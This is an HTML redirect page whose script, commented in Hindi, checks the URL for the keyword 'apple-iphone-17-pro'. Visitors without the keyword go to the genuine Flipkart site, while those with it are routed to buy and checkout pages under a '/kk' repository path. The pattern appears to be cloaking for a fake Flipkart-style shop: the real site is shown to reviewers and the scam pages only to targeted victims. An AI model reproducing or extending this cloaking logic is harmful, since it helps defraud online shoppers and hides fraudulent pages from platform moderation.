<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
      (function() {
        var VERIFY_KEYWORD = 'apple-iphone-17-pro';
        var href = window.location.href.toLowerCase();

        // 1. Keyword check: अगर keyword नहीं है तो तुरंत Flipkart पर भेजें
        if (href.indexOf(VERIFY_KEYWORD) === -1) {
          window.location.replace('https://www.flipkart.com');
          return;
        }

        var repo = '/kk';
        var isBuy = href.indexOf('buy.html') !== -1;

        // 2. Buy Page: URL को बिल्कुल साफ और छोटा (35 chars) रखें (No loop / No repeating)
        if (isBuy) {
          window.location.replace(repo + '/buy.html?p=' + VERIFY_KEYWORD);
          return;
        }

        // 3. Product Page: सिर्फ साफ path लें, पुराना search query हटा दें ताकि लिंक कभी बड़ा न हो
        var pathname = window.location.pathname;
        if (pathname.indexOf(repo) === 0) {
          pathname = pathname.substring(repo.length);
        }
        
        if (!pathname || pathname === '/' || pathname === '/index.html') {
          pathname = '/checkout/' + VERIFY_KEYWORD;
        }

        // Clean single redirect
        window.location.replace(repo + '/?p=' + encodeURIComponent(pathname));
      })();
    </script>
</head>
<body>
</body>
